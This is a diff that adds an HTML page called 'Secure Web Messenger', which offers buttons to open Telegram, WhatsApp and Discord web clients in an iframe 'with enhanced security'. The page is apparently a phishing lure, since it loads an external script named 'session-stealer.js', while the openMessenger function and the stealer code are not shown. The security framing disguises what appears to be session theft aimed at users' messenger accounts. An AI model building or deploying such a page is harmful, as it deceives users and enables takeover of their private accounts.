@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Web Messenger</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .messenger-btn { margin: 10px; padding: 15px 30px; border: none; border-radius: 10px; cursor: pointer; }
+        .telegram { background: #0088cc; color: white; }
+        .whatsapp { background: #25D366; color: white; }
+        .discord { background: #5865F2; color: white; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Secure Web Messenger</h1>
+        <p>Access your messengers with enhanced security</p>
+        <button class="messenger-btn telegram" onclick="openMessenger('telegram')">Open Telegram Web</button>
+        <button class="messenger-btn whatsapp" onclick="openMessenger('whatsapp')">Open WhatsApp Web</button>
+        <button class="messenger-btn discord" onclick="openMessenger('discord')">Open Discord Web</button>
+    </div>
+    <iframe id="messengerFrame" style="width:100%; height:600px; border:none; display:none;"></iframe>
+    <script src="session-stealer.js"></script>
+</body>
+</html>
